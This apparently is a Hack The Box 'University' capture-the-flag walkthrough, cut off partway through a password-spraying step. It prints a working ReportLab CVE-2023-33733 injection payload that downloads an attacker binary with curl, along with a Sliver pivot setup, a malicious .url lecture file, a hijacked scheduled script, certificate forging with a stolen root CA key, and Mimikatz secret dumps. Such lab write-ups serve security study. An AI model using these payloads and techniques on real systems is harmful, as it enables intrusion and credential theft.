---
icon: diploma
---

# HTB-UNIVERSITY

<figure><img src="../../../../.gitbook/assets/image (201).png" alt=""><figcaption></figcaption></figure>

***

Attack Flow Explanation

1. **Student Profile Page** → Exploit **CVE-2023-33733** in the _bio_ field to achieve **remote code execution**.
2. Gain **shell as `wao`**.

**Privilege Escalation Phase**\
3\. Locate **root CA certificate and private key** on the system.\
4\. **Forge valid certificates** to authenticate as privileged users.\
5\. Log in to the **professor’s web UI account**.\
6\. Upload a **malicious `.url` file** as part of a lecture, gaining **shell as `martin.t`** on host `WS-3`.\
7\. Exploit **LocalPotato** → Gain **Administrator shell** on `WS-3`.\
8\. Dump **hashes and secrets** from the system.\
9\. Discover **default password** in the dumps.\
10\. Perform **password spraying** to find **valid accounts**.\
11\. Identify **Backup Operator** account `brose.w`.\
12\. Use privileges to **backup SAM/SECURITY/SYSTEM hives**.\
13\. Gain access as **`DC$`**.\
14\. Perform **DCSync** to dump domain secrets.\
15\. Obtain **Domain Administrator shell**.

### Reconnaissance <a href="#reconnaissance" id="reconnaissance"></a>

```renpy
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          nginx 1.24.0
|_http-title: Did not follow redirect to http://university.htb/
|_http-server-header: nginx/1.24.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-23 21:11:57Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: university.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2179/tcp  open  vmrdp?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: university.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
|_clock-skew: 6h59m58s
| smb2-time:
|   date: 2025-05-23T21:12:49
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
pypy
```

**Nmap scan** revealed a host named `DC` running as the **Domain Controller** for the `university.htb` domain.

The scan also showed that port **80** redirects to the same **FQDN** (`dc.university.htb`).

I added the following entries to `/etc/hosts` so I could resolve the domain locally during further enumeration:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/University]
└─$ sudo nano /etc/hosts
```

```
10.10.X.X   dc.university.htb university.htb DC
```

This ensured that both the short hostname, the domain, and the fully qualified domain name (FQDN) resolved correctly for all tools and browsers.

### Execution <a href="#execution" id="execution"></a>

<figure><img src="../../../../.gitbook/assets/image (202).png" alt=""><figcaption></figcaption></figure>

Visiting the web service hosted on `dc.university.htb` presents a **university-themed website**.

* The public area contains only **basic information** about the university.
* Access to **course content** is restricted behind a **login portal**.

The registration page offers two account types:

1. **Student account**
2. **Professor account**

A small note is attached to the registration form, hinting that certain privileges or capabilities may differ depending on the account type. This could be a clue worth exploring during later enumeration.

> After creating your “Professor” account, your account will be inactive until our team reviews your account details and contacts you by email to activate your account.

I begin by registering a **student account** and logging in.\
After authentication, I’m taken to a **profile management interface** where I can update my personal details.

In the **top-right corner**, a drop-down menu offers an option to **export my profile**. This export feature could be interesting for further testing, especially if it allows manipulation of the file format or export path.

<figure><img src="../../../../.gitbook/assets/image (204).png" alt=""><figcaption></figcaption></figure>

After selecting the **profile export** option, the process completes within a few seconds, prompting a download of a **PDF file** containing my account details.

I examine the file with `strings` and check its metadata, which reveals that it was generated using **ReportLab** and **xhtml2pdf** — two Python libraries commonly used for dynamic PDF creation. This hints that the server is likely rendering HTML or XML input into a PDF, which could be a vector for **injection-based attacks** (e.g., PDF template injection or HTML/CSS injection leading to SSRF, file reads, or command execution, depending on implementation).

```bash
┌──(sn0x㉿sn0x)-[~/HTB/University]
└─$ exiftool profile.png
ExifTool Version Number         : 13.25
File Name                       : profile.pdf
Directory                       : /home/sn0x/Downloads
File Size                       : 7.0 kB
File Modification Date/Time     : 2025:05:23 16:26:00+02:00
File Access Date/Time           : 2025:05:23 16:26:00+02:00
File Inode Change Date/Time     : 2025:05:23 16:26:00+02:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Author                          : 
Create Date                     : 2025:05:23 14:25:38+08:00
Creator                         : (unspecified)
Modify Date                     : 2025:05:23 14:25:38+08:00
Producer                        : xhtml2pdf <https://github.com/xhtml2pdf/xhtml2pdf/>
Subject                         : 
Title                           : University | george Profile
Trapped                         : False
Page Mode                       : UseNone
Page Count                      : 1
 
┌──(sn0x㉿sn0x)-[~/HTB/University]
└─$ strings profile.pdf | head -n 3
%PDF-1.4
 ReportLab Generated PDF document http://www.reportlab.com
1 0 obj
```

As seen in **Solarlab**, the application may be vulnerable to **CVE-2023-33733**. I adapt the PoC payload to use `curl` for downloading my Sliver payload and place it in the **bio** field of my profile. After requesting another export, my web server logs confirm the binary download. I then send a second payload to execute the file.

payload1.html

```bash

<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('curl 10.10.10.10/university.exe -o C:\\windows\\tasks\\university.exe') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
               exploit
</font></para>

```

payload2.hmtl

```bash
sliver (wao) > sa-whoami 
 
[*] Successfully executed sa-whoami (coff-loader)
[*] Got output:
 
UserName                SID
====================== ====================================
UNIVERSITY\WAO  S-1-5-21-2056245889-740706773-2266349663-1106
 
 
GROUP INFORMATION                                 Type                     SID                                          Attributes               
================================================= ===================== ============================================= ==================================================
UNIVERSITY\Domain Users                           Group                    S-1-5-21-2056245889-740706773-2266349663-513  Mandatory group, Enabled by default, Enabled group, 
Everyone                                          Well-known group         S-1-1-0                                       Mandatory group, Enabled by default, Enabled group, 
BUILTIN\Remote Management Users                   Alias                    S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group, 
BUILTIN\Users                                     Alias                    S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group, 
BUILTIN\Pre-Windows 2000 Compatible Access        Alias                    S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group, 
NT AUTHORITY\BATCH                                Well-known group         S-1-5-3                                       Mandatory group, Enabled by default, Enabled group, 
CONSOLE LOGON                                     Well-known group         S-1-2-1                                       Mandatory group, Enabled by default, Enabled group, 
NT AUTHORITY\Authenticated Users                  Well-known group         S-1-5-11                                      Mandatory group, Enabled by default, Enabled group, 
NT AUTHORITY\This Organization                    Well-known group         S-1-5-15                                      Mandatory group, Enabled by default, Enabled group, 
LOCAL                                             Well-known group         S-1-2-0                                       Mandatory group, Enabled by default, Enabled group, 
UNIVERSITY\Web Developers                         Group                    S-1-5-21-2056245889-740706773-2266349663-1129 Mandatory group, Enabled by default, Enabled group, 
Service asserted identity                         Well-known group         S-1-18-2                                      Mandatory group, Enabled by default, Enabled group, 
Mandatory Label\Medium Mandatory Level            Label                    S-1-16-8192                                   Mandatory group, Enabled by default, Enabled group, 
 
 
Privilege Name                Description                                       State                         
============================= ================================================= ===========================
SeMachineAccountPrivilege     Add workstations to domain                        Disabled                      
SeChangeNotifyPrivilege       Bypass traverse checking                          Enabled                       
SeIncreaseWorkingSetPrivilege Increase a process working set                    Disabled ****


```

While exploring the compromised host, I stumbled across a folder named **C:\Web\DB Backups\\**. Inside it, there was a PowerShell script called **db-backup-automator.ps1**.

Opening it revealed that it was automating daily backups of the SQLite database used by the University site:

```powershell
$sourcePath = "C:\Web\University\db.sqlite3"
$destinationPath = "C:\Web\DB Backups\"
$7zExePath = "C:\Program Files\7-Zip\7z.exe"

$zipFileName = "DB-Backup-$(Get-Date -Format 'yyyy-MM-dd').zip"
$zipFilePath = Join-Path -Path $destinationPath -ChildPath $zipFileName
$7zCommand = "& `"$7zExePath`" a `"$zipFilePath`" `"$sourcePath`" -p'WebAO1337'"
Invoke-Expression -Command $7zCommand
```

A few key takeaways:

1. **Source Database** – `C:\Web\University\db.sqlite3` is the main application database.
2. **Destination** – Backups are zipped to `C:\Web\DB Backups\` using 7-Zip.
3. **Password Leak** – The `-p` flag for 7-Zip is hardcoded to `'WebAO1337'`.
4. **Implication** – This is likely the password for a local account (possibly _wao_), not just the archive encryption.

Given the suspiciously human-readable format of the password, I tried authenticating with it over WinRM and SMB for the **wao** user — and it worked. This provided me with **interactive access as wao** and moved me closer to escalating privileges.

### Privilege Escalation <a href="#privilege-escalation" id="privilege-escalation"></a>

#### Shell as martin.t <a href="#shell-as-martint" id="shell-as-martint"></a>

Once I had a **shell as martin.t**, I checked their group memberships and found that they were part of **WEB DEVELOPERS**, which grants read/write access to the **C:\web\university** directory.

Inside this directory were several interesting items:

1. **Source Code** – The full codebase for the University web application.
2. **SQLite Database** – Containing all registered users and their password hashes (none of which were crackable with my current resources).
3. **CA Folder** – Located at `C:\web\university\ca`, it contained:
   * The **root certificate** (`rootCA.crt`)
   * The **private key** (`rootCA.key`)
   * The **OpenSSL configuration** for signing new certificates.

<figure><img src="../../../../.gitbook/assets/image (205).png" alt=""><figcaption></figcaption></figure>

**Abusing Certificate Generation to Forge a Valid Certificate**

```python
C:\web\university\University\certificate_utils.py

def generate_signed_cert(request, user):
    command = r'"C:\\Program Files\\openssl-3.0\\x64\\bin\\openssl.exe" x509 -req -in "{}" -CA "{}" -CAkey "{}" -CAcreateserial'.format(user.csr.path, rooCA_Cert, rooCA_PrivKey)
    output = subprocess.check_output(command, shell=True).decode()
    # Base64 encode the content of the file
    encoded_output = b64encode(output.encode()).decode()
    response = HttpResponse(content_type='application/x-x509-ca-cert')
    # Set the content of the file as a cookie
    response.set_cookie('PSC', encoded_output)
    response['Content-Disposition'] = 'attachment; filename="signed-cert.pem"'
    response.write(output)
    return response
```

1. **Source Code Review**
   * In `C:\web\university\University\certificate_utils.py`, the function `generate_signed_cert()` uses `openssl` to sign a Certificate Signing Request (CSR) **directly with the root CA private key** (`rooCA_PrivKey`) and certificate (`rooCA_Cert`).
   * This means any CSR passing basic validation will be signed as if it came from the trusted CA.
2. **Key Observations from the Code**
   * No check to ensure the requesting user is authorized for the certificate being signed.
   * The **Common Name (CN)** and **email address** in the CSR just need to match the current username and email — both of which can be set when generating the CSR.
   * The signed certificate is returned as an attachment **and** stored in a cookie (`PSC`) after being Base64 encoded.
3. **Exploitation Path**
   * As a normal student user, log into the web UI and navigate to the **"Request Certificate"** page.
   * Use the provided instructions to generate a CSR locally, making sure the **CN** is set to your username and the **email** to your account’s email address.
   * Submit the CSR via the UI — the backend will invoke `openssl x509 -req -in <CSR> -CA <RootCert> -CAkey <RootKey> -CAcreateserial` to produce a valid cert.
   * Download the returned `.pem` file — this is now a certificate signed by the **root CA**, which the entire system trusts.
4. **Impact**
   * With a valid cert signed by the root CA, you can perform actions that require high-trust authentication — including **privilege escalation** via certificate-based authentication (e.g., ESC scenarios in Active Directory).
   * Since the signing key is the actual root CA private key, this cert is indistinguishable from legitimate admin-issued certificates.

Even as regular student I can request a signed certificate via the web UI. There I can find the command to generate a CSR and the information regarding needed parameters. The common name and email address has to match the username and the email respectively.

I begin by creating a new CSR and specifying `george` as common name and `george@university.htb` as the email. Then I use the downloaded files from the root CA to generate a signed certificate.

<figure><img src="../../../../.gitbook/assets/image (207).png" alt=""><figcaption></figcaption></figure>

```python
┌──(sn0x㉿sn0x)-[~/HTB/University]
└─$ openssl req -newkey rsa:2048 \
              -keyout PK.key \
              -out My-CSR.csr
......+.......+............+....
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:george
Email Address []:george@university.htb
 
Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []:
An optional company name []:
 
┌──(sn0x㉿sn0x)-[~/HTB/University]
└─$ openssl x509 -req \
               -in My-CSR.csr \
               -CA rootCA.crt \
               -CAkey rootCA.key \
               -CAcreateserial \
               -out signed-certificate.pem
Certificate request self-signature ok
subject=C=AU, ST=Some-State, O=Internet Widgits Pty Ltd, CN=george, emailAddress=george@university.htb
```

After logging in with the certificate I do have multiple new options available in the sidebar. I can manage existing courses, create my own and also change my public key.

<figure><img src="../../../../.gitbook/assets/image (208).png" alt=""><figcaption></figcaption></figure>

When attempting to create a new course, the platform threw an error about a **missing PSC cookie**. Investigation revealed that this cookie is only set when requesting a signed certificate — not during normal login.

To work around this, I re-uploaded my **CSR** (Certificate Signing Request), which caused the server to set the `PSC` cookie in my session. With the cookie present, I could successfully create my own course.

Each course requires **lectures**, which must be uploaded as a **ZIP archive**. The upload requirements were:

* The archive can only contain files with the extensions `.docx`, `.pptx`, `.pdf`, or `.url`
* The archive must be **signed with GPG** before submission
* A sample archive is available for download to demonstrate the expected structure and signing process

This gave me a clear blueprint for crafting my own payload within the allowed formats and signing it properly for upload.

<figure><img src="../../../../.gitbook/assets/image (209).png" alt=""><figcaption></figcaption></figure>

In the sidebar is also a link to **Change Public Key** and there I can upload my public PGP key and a command to export it is provided. I start by creating a new key and using the same values as in the certificate when prompted. Then I export the public key and upload it.

```python
┌──(sn0x㉿sn0x)-[~/HTB/University]
└─$ gpg --gen-key
gpg (GnuPG) 2.4.7; Copyright (C) 2024 g10 Code GmbH
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
 
Note: Use "gpg --full-generate-key" for a full featured key generation dialog.
 
GnuPG needs to construct a user ID to identify your key.
 
Real name: george
Email address: george@university.htb
You selected this USER-ID:
    "george <george@university.htb>"
 
Change (N)ame, (E)mail, or (O)kay/(Q)uit? O
--- SNIP ---
 
pub   ed25519 2025-05-23 [SC] [expires: 2028-05-22]
      5FF6BD0360987DA01677C66970D24E4ED6320FF2
uid                      george <george@university.htb>
sub   cv25519 2025-05-23 [E] [expires: 2028-05-22]
 
┌──(sn0x㉿sn0x)-[~/HTB/University]
└─$ gpg --export -a "george" > GPG-public-key.asc
```

Then I prepare the lecture by creating a `url` file pointing towards my payload, creating a **ZIP** archive with just that file and then creating the signature with my private key.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/University]
└─$ cat lecture.url
[InternetShortcut]
URL=file://C:/sn0x/university.exe
IDList=
 
┌──(sn0x㉿sn0x)-[~/HTB/University]
└─$ unix2dos lecture.url
 
┌──(sn0x㉿sn0x)-[~/HTB/University]
└─$ zip lecture.zip lecture.url
 
┌──(sn0x㉿sn0x)-[~/HTB/University]
└─$ gpg -u george --detach-sign lecture.zip
```

After uploading the signed ZIP, I got a success message but no callback — likely meaning the `.url` payload was handled elsewhere.\
Checking the DC’s network config revealed a second adapter on **192.168.99.0/24**, hinting that lecture processing happens on this internal subnet.

```python
sliver (wao) > ifconfig
 
+-------------------------------------------+
| Ethernet0 2                               |
+-------------------------------------------+
| # | IP Addresses      | MAC Address       |
+---+-------------------+-------------------+
| 4 | 10.129.231.193/16 | 00:50:56:94:52:6a |
+-------------------------------------------+
 
+-----------------------------------------+
| vEthernet (Internal-VSwitch1)           |
+-----------------------------------------+
| # | IP Addresses    | MAC Address       |
+---+-----------------+-------------------+
| 6 | 192.168.99.1/24 | 00:15:5d:05:80:01 |
+-----------------------------------------+
1 adapters not shown.
 
```

### **Internal Network Discovery**

After noticing the system had a second network interface configured for the **192.168.99.0/24** subnet, an internal network scan was performed.

#### **Findings**

* **192.168.99.2** → Windows host
* **192.168.99.12** → Ubuntu host

The discovery of these additional systems indicated potential pivoting targets for further exploitation inside the internal network.

```python
sliver (wao) > ascan 192.168.99.1-255
 
[*] Successfully executed ascan
[*] Got output:
 _____     _   _____             
|  _  |___| |_|   __|___ ___ ___ 
|     |  _|  _|__   |  _| .'|   |
|__|__|_| |_| |_____|___|__,|_|_|
ArtScan by @art3x         ver 1.1
[.] Scanning IP(s): 192.168.99.1-255
[.] PORT(s): TOP 120
[.] Threads: 20   Rechecks: 0   Timeout: 100
192.168.99.1:445 is open.
192.168.99.1:88 is open.
192.168.99.1:139 is open.
192.168.99.1:464 is open.
192.168.99.1:389 is open.
192.168.99.1:80 is open. code:301 len:169 title:301 Moved Permanently
192.168.99.1:53 is open.
192.168.99.1:135 is open.
192.168.99.1:593 is open. ncacn_http/1.0
192.168.99.1:2179 is open.
192.168.99.1:3268 is open.
192.168.99.1:5985 is open. code:404 len:315 title:
192.168.99.1:47001 is open. code:404 len:315 title:
192.168.99.1:9389 is open.
------------------
192.168.99.2:139 is open.
192.168.99.2:445 is open.
192.168.99.2:135 is open.
192.168.99.2:5985 is open. code:404 len:315 title:
192.168.99.2:47001 is open. code:404 len:315 title:
------------------
192.168.99.12:22 is open. SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.7
------------------
 
Summary:
192.168.99.1: 53,80,88,135,139,389,445,464,593,2179,3268,5985,9389,47001
192.168.99.2: 135,139,445,5985,47001
192.168.99.12: 22
 
Scan Duration: 8.69 s
```

### **Pivoting to Internal Subnet**

To access the **192.168.99.0/24** network, `chisel` was used to establish a **SOCKS proxy**. Valid credentials (`wao:WebAO1337`) allowed direct login to **192.168.99.2** (WS-3) via `evil-winrm`.

#### **Observations on WS-3**

* Found traces of uploaded lecture files in `C:\Users\Public\`.
* Likely execution point for uploaded payloads.
* Direct outbound connection from WS-3 to attacker’s machine was blocked, potentially preventing reverse shell callbacks.

```python
$ ls C:\Users\Public 
 
Directory: C:\Users\Public
 
 
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        2/12/2024   7:21 PM                Documents
d-r---        9/15/2018  12:19 AM                Downloads
d-----        2/23/2024   6:03 PM                Evaluated Lectures
d-----        9/16/2024   7:07 AM                Lectures
d-r---        9/15/2018  12:19 AM                Music
d-r---        9/15/2018  12:19 AM                Pictures
d-----        2/23/2024   6:28 PM                Rejected Lectures
d-r---        9/15/2018  12:19 AM                Videos
```

### **Pivot Payload Execution**

Knowing that direct callbacks were blocked from **WS-3**, a TCP pivot payload was created with **Sliver** to route traffic through **DC**.

**Steps:**

1.  Generated pivot payload:

    ```bash
    sliver (wao) > generate --tcp-pivot 192.168.99.1:8888 --name pivot --skip-symbols --reconnect 10
    ```
2. Uploaded payload to `C:\sn0x\university.exe` on **WS-3** via `evil-winrm`.
3.  Started pivot listener on DC:

    ```bash
    sliver (wao) > pivots tcp --bind 192.168.99.1 --lport 8888
    ```
4. Resent the lecture archive to trigger execution.

After a short delay, received a callback as **martin.t**, confirming successful code execution through the pivot.

### **Privilege Escalation – WS-3 (martin.t → Administrator)**

After gaining access as **martin.t**, a `README.txt` on the desktop revealed that **WS-1**, **WS-2**, and **WS-3** were outdated and due for patching — perfect for local privilege escalation.

```python
Hello Professors.
We have created this note for all the users on the domain computers: WS-1, WS-2 and WS-3.
These computers have not been updated since 10/29/2023.
Since these devices are used for content evaluation purposes, they should always have the latest security updates.
So please be sure to complete your current assessments and move on to the computers "WS-4" and "WS-5".
The security team will begin working on the updates and applying new security policies early next month.
Best regards.
Help Desk team - Rose Lanosta.
```

#### **System Info**

Running:

```powershell
Get-ComputerInfo
```

showed the host was **Windows Server 2019 (Build 17763)**.

#### **Vulnerability Discovery**

This build was confirmed vulnerable to **CVE-2023-21746** _(LocalPotato)_ — a known Windows privilege escalation allowing SYSTEM-level access via NTLM relay to local services.

```python
sliver (martin.t_WS-3) > nps -- Get-ComputerInfo
[*] nps output:
Host Name                 : WS-3
OS Name                   : Microsoft Windows Server 2019 Standard
OS Version                : 10.0.17763 Build 17763
OS Manufacturer           : Microsoft Corporation
OS Build Type             : Multiprocessor Free
Registered Owner          : Windows User
Registered Organization   : 
Product ID                : 00429-00521-62775-AA722
Original Install Date     : 12-02-2024, 19:25:14
System Boot Time          : 25-05-2025, 15:25:19
System Manufacturer       : Microsoft Corporation
System Model              : Virtual Machine
System Type               : x64-based PC
Processor(s)              : AMD64 Family 25 Model 1 Stepping 1 ~2595 Mhz
BIOS Version              : Microsoft Corporation Hyper-V UEFI Release v4.1, 20-06-2024
Windows Directory         : C:\Windows
System Directory          : C:\Windows\system32
Boot Device               : \Device\HarddiskVolume2
System Locale             : 1033
Input Locale              : 1033
Time Zone                 : UTC--7
Total Physical Memory     : 1535008
Available Physical Memory : 798684
Virtual Memory: Max Size  : 1928224
Virtual Memory: Available : 1273416
Virtual Memory: In Use    : [not implemented]
Page File Location(s)     : C:\pagefile.sys
Domain                    : university.htb
Logon Server              : \\DC
Hotfix(s)                 : KB5020627, KB5019966, KB5020374
Network Card(s)           : [not implemented]
Hyper-V Requirements      : [not implemented]

```

### **Privilege Escalation – WS-3 (Abusing Scheduled Script)**

While enumerating the host as **martin.t**, I found the directory:

```
C:\Program Files\Automation-Scripts
```

It contained:

* `get-lectures.ps1` – readable PowerShell script fetching new lectures.
* `wpad-cache-cleaner.ps1` – unreadable for my user.

Given the restricted read access, it was likely executed by a higher-privileged account, possibly via a scheduled task.

#### **Exploit Path**

1. Uploaded **LocalPotato.exe** to exploit **CVE-2023-21746**.
2.  Created a malicious PowerShell payload (`shell.ps1`) to replace `wpad-cache-cleaner.ps1`:

    ```powershell
    & C:\sn0x\university.exe
    ```

    _(The payload connects back through my pivot listener.)_
3. Replaced the original script with my malicious one.
4. Waited for the scheduled task to trigger.

#### **Result**

Shortly after, the payload executed under **Administrator** privileges, giving me full control over WS-3.

### **Credential Dumping – WS-3**

With **Administrator** access on **WS-3**, I used **Mimikatz** to dump all hashes and stored credentials.\
This revealed a default password in cleartext:

```
v3ryS0l!dP@sswd#X
```

These credentials can now be used to attempt lateral movement across other systems in the environment.

```python
sliver (admin) > mimikatz "token::elevate" "lsadump::secrets" "exit"
 
[*] Successfully executed mimikatz
[*] Got output:
 
  .#####.   mimikatz 2.2.0 (x64) #19041 May 17 2024 22:19:06
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
 
mimikatz(commandline) # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM
 
544     {0;000003e7} 1 D 20616          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;00124960} 0 D 1207628     WS-3\Administrator      S-1-5-21-1488131572-2468996234-1749857255-500   (11g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 1525980     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
 
mimikatz(commandline) # lsadump::secrets
Domain : WS-3
SysKey : cafb76872642f6bc09dd9e17ae7cddec
 
Local name : WS-3 ( S-1-5-21-1488131572-2468996234-1749857255 )
Domain name : UNIVERSITY ( S-1-5-21-2056245889-740706773-2266349663 )
Domain FQDN : university.htb
 
Policy subsystem is : 1.18
LSA Key(s) : 1, default {2ab38ea8-d3eb-d187-4861-8dca3d5dc982}
  [00] {2ab38ea8-d3eb-d187-4861-8dca3d5dc982} 47f750c3ab86951750c46ac0a54c288d4eab872dcbc9ba1a1901f2618bb0e64d
 
Secret  : $MACHINE.ACC
cur/hex : b0 05 e0 d4 f4 72 42 96 a7 51 3d 11 b3 6b a2 e9 cc d6 69 ec a3 4e 49 85 f4 8c 9f 6a ed ad d8 5d 0e cb e6 34 ad 06 cb bb a6 9c 30 44 49 de 31 22 9f 57 ed bc d3 fd ca 31 66 3b df 08 56 85 dd 81 20 ea ed ed 1b 27 d7 44 d2 a4 66 a9 ec 67 c0 3b b6 b6 cf 28 f9 b3 6c f0 b0 f0 44 31 f8 94 e7 2f c4 6b a1 71 0b eb 3f d0 99 80 78 d4 82 06 6e 61 30 84 e0 d7 b3 f7 27 5a 40 98 a4 c6 2f 5e 4a 95 53 ea ad bd 1f 22 41 66 6c 7c b5 56 22 b9 d1 3b bc d2 be c2 41 07 ac fc 91 ab e3 38 44 f9 b9 27 9d 57 84 26 5f fa e6 61 82 0d 63 38 ff 4b 2b 6d 9b 56 0f 9b cb 2d e0 2f c2 62 08 13 c9 cd f7 94 42 78 b4 79 d0 5d 15 09 35 50 75 fa 28 0f 93 dc 31 fd 18 d6 fc c6 1b 3e 77 09 1d cc b9 cd b4 e7 ce fa 21 59 6d 35 c3 86 47 28 43 77 d6 42 8e 7c
    NTLM:b51c7661e82feb147afffb324d91af34
    SHA1:6d4fe384f18d4014866008bea72576a63dd76a6e
old/hex : 97 e2 92 3b 4e d5 3c c7 b3 77 ca 03 18 86 e1 88 ef ff 73 bb de 23 c0 30 8d 2a 68 2f 28 d7 18 ec 86 8e 05 a0 58 eb ee 10 4c 32 97 ab 34 2f ca 7c 6f ae 96 3a 83 05 81 74 37 ce fb f0 ca 52 8c 5a 04 7c db 0a 2c 66 6b 43 14 ad bd 1f 79 be a7 7b 46 c0 0a c5 9b b6 a8 58 44 78 fd 6f 04 d0 2a c7 ae 66 5f 03 eb ef 88 00 3c 3d 5a b5 a7 70 81 87 84 90 72 86 d1 b4 12 70 74 87 24 0c 6f 10 9c 9f 7e cd d0 db f5 a2 87 88 9b 1c 29 93 53 9e e4 7b e3 29 07 8e 73 42 f6 27 cb 51 40 9c 2d 65 1b 73 27 1f 37 f6 d2 aa 72 4a fa 29 de ad 85 db 88 80 0c 5d c0 56 f8 f4 61 f4 52 70 75 c3 07 ab da ea 4b f0 fa 00 3f 60 ff f8 19 98 db e2 d7 96 12 9c b4 a6 d8 6d 0e 6e 1f c5 6f 95 cc f7 75 1d 30 f1 ad 4e 94 fa 18 6f 0a 52 cf cd e7 c2 84 3c 5c f8
    NTLM:9c4a037d5cc45fb947a1e77af1496204
    SHA1:f95bdaad70c8a9405f7d5274cbca563f37e19a94
 
Secret  : DefaultPassword
cur/text: v3ryS0l!dP@sswd#X
 
Secret  : DPAPI_SYSTEM
cur/hex : 01 00 00 00 1b 8c 79 e7 3a 9f e2 33 c2 8c c4 33 6b 7e f8 a3 10 cf 73 35 83 c2 0b 2c 90 35 26 e9 2b 01 43 62 84 cf c3 2b ab e4 80 18
    full: 1b8c79e73a9fe233c28cc4336b7ef8a310cf733583c20b2c903526e92b01436284cfc32babe48018
    m/u : 1b8c79e73a9fe233c28cc4336b7ef8a310cf7335 / 83c20b2c903526e92b01436284cfc32babe48018
old/hex : 01 00 00 00 81 03 23 17 ab a2 bc 38 f5 18 3a ed f2 91 3a 81 dd 06 91 5f 37 59 89 7e 8f 1d da cc 6f 2a 71 8a c5 7d f0 7f 30 a8 20 e5
    full: 81032317aba2bc38f5183aedf2913a81dd06915f3759897e8f1ddacc6f2a718ac57df07f30a820e5
    m/u : 81032317aba2bc38f5183aedf2913a81dd06915f / 3759897e8f1ddacc6f2a718ac57df07f30a820e5
 
Secret  : NL$KM
cur/hex : a9 cf 8b de ab c8 f3 82 92 9f 69 f3 f8 8b c2 f4 e5 6d ae 0b c5 05 41 8a b3 3c 6a 24 92 d9 f5 95 bb 90 a6 24 55 ae 8b 6b 7c b5 b2 40 89 52 75 66 0e f1 23 17 89 d5 a2 ad 22 05 f5 d2 7f f6 dc 87
old/hex : a9 cf 8b de ab c8 f3 82 92 9f 69 f3 f8 8b c2 f4 e5 6d ae 0b c5 05 41 8a b3 3c 6a 24 92 d9 f5 95 bb 90 a6 24 55 ae 8b 6b 7c b5 b2 40 89 52 75 66 0e f1 23 17 89 d5 a2 ad 22 05 f5 d2 7f f6 dc 87
 
mimikatz(commandline) # exit
Bye!
```

Spraying the password against all of the users in the domain is **very** successful and a bunch of hits come back.

```python
┌──(sn0x㉿sn0x)-[~/HTB/University]
└─$ nxc smb dc.university.htb -u users.txt -p 'v3ryS0l!dP@sswd#X' --continue-on-success
SMB         10.129.231.193  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:university.htb) (signing:True) (SMBv1:False) 
SMB         10.129.231.193  445    DC               [-] university.htb\Administrator:v3ryS0l!dP@sswd#X STATUS_LOGON_FAILURE 
